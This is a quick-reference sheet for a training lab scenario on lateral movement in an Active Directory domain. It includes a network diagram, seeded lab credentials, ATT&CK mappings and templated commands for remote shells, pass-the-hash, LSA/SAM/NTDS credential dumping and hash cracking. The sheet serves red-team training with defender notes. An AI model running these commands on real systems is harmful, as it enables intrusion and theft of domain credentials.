# Quick Reference -- SCEN-003: APT Lateral Movement

## Network Diagram

```
  vmbr1 -- Red Zone                     vmbr2 -- Blue Zone (lab.local)
  +---------------------------+         +------------------------------------------+
  |                           |         |                                          |
  |  +---------------------+ |         |  +-----------+  +----------+  +--------+ |
  |  | kali-attacker       |===========|  | dc01      |  | ws01     |  | ws02   | |
  |  | <red>.10            | |  dual   |  | <blue>.20 |  | <blue>.30|  |<blue>.40|
  |  | Attacker platform   | |  homed  |  | DC / DNS  |  | Foothold |  | Pivot  | |
  |  +---------------------+ |         |  | Kerberos  |  |          |  | target | |
  |                           |         |  +-----------+  +----------+  +--------+ |
  +---------------------------+         +------------------------------------------+
```

## VM Details

| VM | IP | OS | Key Ports | Role |
|---|---|---|---|---|
| kali-attacker | `<red>.10` / `<blue>.10` | Kali 2024 | -- | Your attack platform |
| dc01 | `<blue>.20` | Win Server 2022 | 88, 389, 445, 636 | Domain Controller |
| ws01 | `<blue>.30` | Windows 10 | 445, 5985 | Initial target |
| ws02 | `<blue>.40` | Windows 10 | 445, 5985 | Lateral movement target |

## Initial Credentials

| Username | Password | Domain |
|---|---|---|
| jsmith | Password123 | lab.local |

## ATT&CK Techniques in Scope

| ID | Technique | Tactic |
|---|---|---|
| T1021.002 | Remote Services: SMB/Admin Shares | Lateral Movement |
| T1003.001 | OS Credential Dumping: LSASS Memory | Credential Access |
| T1003.003 | OS Credential Dumping: NTDS | Credential Access |
| T1059.001 | Command and Scripting: PowerShell | Execution |
| T1558.003 | Kerberoasting | Credential Access |
| T1574.001 | DLL Search Order Hijacking | Persistence |

## Tool Command Reference

### Remote Shell Access

```bash
# PsExec (creates service on target -- noisy but reliable)
impacket-psexec <domain>/<user>:'<password>'@<target_ip>

# SMBExec (no service creation -- quieter)
impacket-smbexec <domain>/<user>:'<password>'@<target_ip>

# WMIExec (uses WMI -- different detection footprint)
impacket-wmiexec <domain>/<user>:'<password>'@<target_ip>

# WinRM (uses HTTP/5985 -- different protocol entirely)
evil-winrm -i <target_ip> -u <user> -p '<password>'

# Pass-the-Hash (use NTLM hash instead of password)
impacket-psexec -hashes :<ntlm_hash> <domain>/<user>@<target_ip>
```

### Credential Dumping

```bash
# Remote credential dump (preferred -- runs from Kali)
impacket-secretsdump <domain>/<user>:'<password>'@<target_ip>

# LSA dump via CrackMapExec
crackmapexec smb <target_ip> -u <user> -p '<password>' -d <domain> --lsa

# SAM dump via CrackMapExec
crackmapexec smb <target_ip> -u <user> -p '<password>' -d <domain> --sam

# NTDS.dit dump (domain controller only)
impacket-secretsdump <domain>/<user>:'<password>'@<dc_ip> -just-dc

# Parse LSASS minidump offline
pypykatz lsa minidump <lsass_dump_file>
```

### Enumeration and Credential Testing

```bash
# Test credentials against a target (look for "Pwn3d!" = admin)
crackmapexec smb <target_ip> -u <user> -p '<password>' -d <domain>

# Enumerate SMB shares
crackmapexec smb <target_ip> -u <user> -p '<password>' -d <domain> --shares

# Enumerate domain users
crackmapexec smb <dc_ip> -u <user> -p '<password>' -d <domain> --users

# Enumerate groups
crackmapexec smb <dc_ip> -u <user> -p '<password>' -d <domain> --groups
```

### Windows Enumeration (from a shell on target)

```cmd
whoami /all
net user /domain
net group "Domain Admins" /domain
net localgroup administrators
ipconfig /all
net share
net view /domain
nltest /dclist:lab.local
```

### Hash Cracking (offline)

```bash
# Crack NTLM hashes with wordlist
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with rules
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

## Objectives Checklist

1. [ ] Establish shell on ws01
2. [ ] Enumerate the domain
3. [ ] Dump credentials from ws01
4. [ ] Identify lateral movement accounts
5. [ ] Pivot to ws02
6. [ ] Dump credentials from ws02
7. [ ] Compromise dc01
8. [ ] Extract NTDS.dit (Bonus)

## Reminders

- Document every step with timestamps in your Incident Report
- Map each action to an ATT&CK technique ID
- Take screenshots of key outputs (credential dumps, shell access)
- Note detection opportunities as you go -- what would a defender see?
